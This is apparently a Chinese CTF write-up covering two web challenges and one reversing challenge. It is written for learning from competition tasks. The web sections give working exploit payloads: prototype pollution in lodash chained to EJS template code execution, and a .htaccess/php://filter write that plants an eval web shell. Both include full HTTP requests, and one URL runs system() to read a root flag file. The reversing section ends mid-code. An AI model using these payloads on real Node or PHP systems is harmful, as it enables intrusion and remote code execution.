# WEB
## HardJS
首先先看代码，稍微浏览一遍看看有什么奇怪的逻辑，一眼就能看出`lodash.deepAssign`很奇怪。但lodash一般来说不会有啥漏洞出现，因此`npm
audit`一下看看是不是有洞。
于是，原型链污染get：
那污染之后我们能干啥呢？那当然是RCE了。搜索了一下eval没搜到，那看看还有谁有动态拼接代码的就行了。这里用到了一个模板引擎ejs，它肯定有代码拼接；直接去看ejs源码。
随便划拉一下屏幕就发现了一大堆源码拼接，从中随便挑一个可以被污染的变量就好了。先看看哪些可能可以操作的，找找大量的`xxx.yyy = xxx.yyy ||
DEFAULT`聚集的地方：
    options.client = opts.client || false;
      options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
      options.compileDebug = opts.compileDebug !== false;
      options.debug = !!opts.debug;
      options.filename = opts.filename;
      options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
      options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
      options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
      options.strict = opts.strict || false;
      options.context = opts.context;
      options.cache = opts.cache || false;
      options.rmWhitespace = opts.rmWhitespace;
      options.root = opts.root;
      options.outputFunctionName = opts.outputFunctionName;
      options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;
      options.views = opts.views;
      options.async = opts.async;
这些全都是可以通过原型链污染控制的，因此再随便翻翻代码找个自己喜欢的点就好。我觉得这个不错：
    var escapeFn = opts.escapeFunction;
    // ......
        if (opts.client) {
          src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
          if (opts.compileDebug) {
            src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
          }
        }
对于这个payload，将`client`、`escapeFn`污染即可RCE。构造出来的长这样：
    {"constructor": {"prototype": {"client": true,"escapeFunction": "1; return process.env.FLAG","debug":true, "compileDebug": true}}}
构造完以后再回头去看题目代码（？顺序不太对吧），组合一下利用链。所以直接打五次后访问首页即可get flag：
    POST /add HTTP/1.1
    Content-Length: 156
    Accept: */*
    DNT: 1
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
    x-forwarded-for: 127.0.0.1'
    Connection: close
    {"type":"wiki","content":{"constructor": {"prototype": {"client": true,"escapeFunction": "1; return process.env.FLAG","debug":true, "compileDebug": true}}}}
## Ezphp
题目源码
访问题目会立马删除同目录下除 index.php 以外的文件，传入的 `$filename`、`$content` 被过滤后再通过
`file_put_contents` 写文件。可以正常上传 php 后缀的文件，但没有解析。打算从`.user.ini` 文件配置
`auto_append_file`，进行文件包含，但由于 `$content` 处过滤了 file 关键字。
对于这些过滤，最简单的办法就是编码绕过，结合这里的 `file_put_contents` ，不难想到 P牛之前发过的
[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，也就是对文件内容编码后再利用 php 伪协议进行解码写入，可惜 filename
还有一层过滤，只能传入字母和点，伪协议就没法用了，那就继续绕 `preg_match`。
说来也巧，P牛还有一篇
[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)，但这种绕过方式并不适合这题。沿着这思路继续看下
[PHP手册](https://www.php.net/manual/zh/pcre.configuration.php)，发现
`pcre.backtrack_limit` 是 `PHP_INI_ALL` ，这意味着我们可以通过 `.user.ini`
对其进行修改。结合刚刚那篇文章，猜想这里的匹配 `preg_match("/[^a-z\.]/)"` 是不是也像这样`[xxx]`的进行回溯。
尝试 `ini_set('pcre.backtrack_limit', 0)`，发现真能绕过`preg_match`，再结合
`php://filter`，就可以在任意位置写入任意内容，并进行文件包含，本地成功打通。
一弄到比赛环境就不行了，这时候队里师傅说这种方式并不适用于 php7，检查了好一会也没发现为什么在 php7 中如此设置会失效，最后看到 php7
多了个配置选项 `pcre.jit`，且这个配置默认为 1，于是尝试将 `pcre.jit` 设置成 0，成功。
这总算做完了吧？结果到了题目环境依旧不行，或许是某些原因导致环境中 .user.ini 并没有被解析，这时候就只有只能覆盖 `.htaccess`
了，但由于上传的文件内容会被额外添加一句`"\nJust one chance"`，`.htaccess`并没有 `.user.ini`
那么强的容错性，一旦格式错误就直接 500 了。在内容末尾加一个`#aa\`就可以突破这种限制。
基本流程就理清楚了：
首先上传一个`.htaccess` 绕过 `preg_match`，再使用 `php://filter`把 `auto_append_file`
的配置写入，覆盖掉原先`.htaccess`，马儿就到手了。
附带 payload
    http://19056a386796436a8c8d1f9694fe8aabcbc77c6f49714b43.changame.ichunqiu.com/?content=php_value%20pcre.backtrack_limit%200%0a%0dphp_value%20pcre.jit%200%0a%0d%0a%0d%23aa\&filename=.htaccess
下面这个打两次
    http://19056a386796436a8c8d1f9694fe8aabcbc77c6f49714b43.changame.ichunqiu.com/index.php?a=system(%27cat%20../../../root/flag.txt%27);exit;&content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKDXBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCg1waHBfdmFsdWUgcGNyZS5qaXQgICAwCg0KDSNhYTw%2FcGhwIGV2YWwoJF9HRVRbJ2EnXSk7Pz5c%3C%3C&filename=php://filter/write=convert.base64-decode/resource=.htaccess
# Reverse
## ooollvm
通过动态调试一步一步的调出flag
程序对每个字符的判断逻辑，只有这两种处理方式:  
(这是爆破符合条件的代码
    for(i = 0;i 
    int main(){
        int i;
        // for(i = 0;i < 256;i++){
            // if(i*0x7a9a-(i*i*0x133-i*i*i) == 0x104e08)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x7b67-(i*i*0x134-i*i*i) == 0x1076f4)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x871f-(i*i*0x143-i*i*i) == 0x12c05d)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x97e5-(i*i*0x156-i*i*i) == 0x166ca4)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x98d4-(i*i*0x157-i*i*i) == 0x16a460)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x895c-(i*i*0x145-i*i*i) == 0x135420)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x888b-(i*i*0x144-i*i*i) == 0x132978)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x80cf-(i*i*0x13b-i*i*i) == 0x1180f5)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x80cf-(i*i*0x13b-i*i*i) == 0x1180f5)
                // putchar(i);
        // }
        // flag{this_is_
        // for(i = 0;i < 256;i++){
            // if(i*0x7a3f-(i*i*0x133-i*i*i) == 0x102b8d)
                // putchar(i);
        // }
        // flag{this_is_a_
        // for(i = 0;i < 256;i++){
            // if(i*0x6b3f-(i*i*0x11f-i*i*i) == 0xd5ba1)
                // putchar(i);
        // }
        // for(i = 0;i < 256;i++){
            // if(i*0x767f-(i*i*0x12e -i*i*i) == 0xf7792)
                // putchar(i);
        // }
        // flag{this_is_a_na
        // for(i = 0;i < 256;i++){
            // if(i*0x7e95-(i*i*0x138 -i*i*i) == 0x11185e)
                // putchar(i);
        // }
        // flag{this_is_a_nai
        // for(i = 0;i < 256;i++){
            // if(i*0x84e5-(i*i*320 -i*i*i) == 0x1256a6)
                // putchar(i);
        // }
        // flag{this_is_a_naiv
        // for(i = 0;i < 256;i++){
            // if(i*0x8861-(i*i*0x144 -i*i*i) == 0x13183e)
                // putchar(i);
        // }
        // flag{this_is_a_naive_
        // for(i = 0;i < 256;i++){
            // if(i*0x7fd3-(i*i*0x13a -i*i*i) == 0x1146b2)
                // putchar(i);
        // }
        // flag{this_is_a_naive_b
        // for(i = 0;i < 256;i++){
            // if(i*0x7083-(i*i*0x126 -i*i*i) == 0xe5916)
                // putchar(i);
        // }
        // flag{this_is_a_naive_bu
        // for(i = 0;i < 256;i++){
            // if(i*0x7c93-(i*i*0x136 -i*i*i) == 0x109ef6)